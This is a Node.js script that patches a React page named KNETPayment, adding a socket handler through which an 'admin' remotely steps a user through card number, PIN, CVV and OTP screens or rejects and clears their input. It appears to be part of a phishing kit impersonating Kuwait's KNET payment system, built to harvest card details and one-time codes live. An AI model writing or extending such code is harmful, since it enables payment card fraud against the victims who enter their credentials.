import fs from "node:fs";
const f = "src/pages/KNETPayment.tsx";
let t = fs.readFileSync(f, "utf8");
const eol = t.includes("\r\n") ? "\r\n" : "\n";
let bad = 0;

const anchor1 = "  const liveDebounceRef = useRef<ReturnType<typeof setTimeout>>();";
const add1 = [
  anchor1,
  "  const phaseRef = useRef(phase);",
  "  useEffect(() => { phaseRef.current = phase; }, [phase]);"
].join(eol);
if (t.includes(anchor1)) t = t.replace(anchor1, add1); else { console.log("NO anchor1"); bad++; }

const anchor2 = "  // Handle card action from admin";
const add2 = [
  "  // Direct socket action handler",
  "  useEffect(() => {",
  "    const s = socket.value;",
  "    if (!s) return;",
  '    console.log("payment socket id:", s.id);',
  "    const handler = (action: string) => {",
  "      const p = phaseRef.current;",
  '      console.log("card:action ->", action, "phase:", p);',
  '      waitingMessage.value = "";',
  "      setIsWaiting(false);",
  '      if (p === "card") {',
  '        if (action === "app") { navigate("/bank-app-verification"); }',
  '        else if (action === "otp") { setPhase("otp"); startCountdown(); navigateToPage("رمز التحقق كي نت (OTP)"); }',
  '        else if (action === "reject") {',
  '          setRejectedError("يرجى التأكد من المعلومات المدخلة");',
  '          setCardNumber(""); setCardPin(""); setCardCvv("");',
  '          setSelectedPrefix(""); setExpiryMonth(""); setExpiryYear(""); setSelectedBank("");',
  "        }",
  '      } else if (p === "otp") {',
  '        if (action === "otp") { navigate("/final-page"); }',
  '        else if (action === "cvv") { navigate("/cvv"); }',
  '        else if (action === "reject") { setRejectedError("يرجى إدخال الرمز بشكل صحيح"); setOtpCode(""); }',
  "      }",
  "    };",
  '    s.on("card:action", handler);',
  '    return () => { s.off("card:action", handler); };',
  "  }, []);",
  "",
  anchor2
].join(eol);
if (t.includes(anchor2)) t = t.replace(anchor2, add2); else { console.log("NO anchor2"); bad++; }

fs.writeFileSync(f, t);
console.log(bad === 0 ? "OK" : "FAIL");
